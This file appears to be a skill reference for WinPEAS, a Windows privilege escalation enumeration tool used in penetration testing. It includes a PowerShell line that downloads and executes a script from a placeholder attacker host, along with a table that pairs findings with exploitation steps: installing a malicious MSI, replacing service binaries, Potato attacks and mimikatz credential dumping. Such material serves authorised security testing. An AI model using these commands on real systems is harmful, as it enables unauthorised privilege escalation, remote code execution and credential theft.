---
name: winpeas
description: "WinPEAS: automated Windows privilege escalation enumeration checking service misconfigurations, unquoted service paths, AlwaysInstallElevated, writable registry keys, token privileges, and stored credentials. Use post-exploitation on Windows as a low-privilege user to surface escalation vectors."
license: MIT (PEASS-ng)
compatibility: "Windows x86/x64. Compiled .exe or PS1 version. No admin required. May trigger AV."
metadata:
  author: AeonDave
  version: "1.0"
---

# WinPEAS

Windows privilege escalation enumeration.

## Quick Start

```
winPEASx64.exe
winPEASx64.exe quiet servicesinfo
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/winPEAS.ps1")
```

## Check Categories

| Argument | What it finds |
|----------|--------------|
| `systeminfo` | OS/patch level, CVE indicators |
| `userinfo` | Token privileges, group memberships |
| `servicesinfo` | Unquoted paths, writable service binaries |
| `applicationsinfo` | Installed software versions |
| `networkinfo` | Interfaces, shares, firewall rules |
| `windowscreds` | DPAPI, vault, autologon, registry creds |
| `filesinfo` | Writable dirs, interesting files |

## High-Value Findings

| Finding | Exploit |
|---------|---------|
| `AlwaysInstallElevated = 1` | `msiexec /quiet /i evil.msi` |
| Unquoted service path | Drop exe in unquoted intermediate directory |
| Writable service binary | Replace binary + restart service |
| SeImpersonatePrivilege | PrintSpoofer / GodPotato |
| Stored DPAPI credentials | `mimikatz dpapi::` or SharpDPAPI |

## Resources

| File | When to load |
|------|--------------|
| `references/` | Potato attacks, exploitation of each vector |
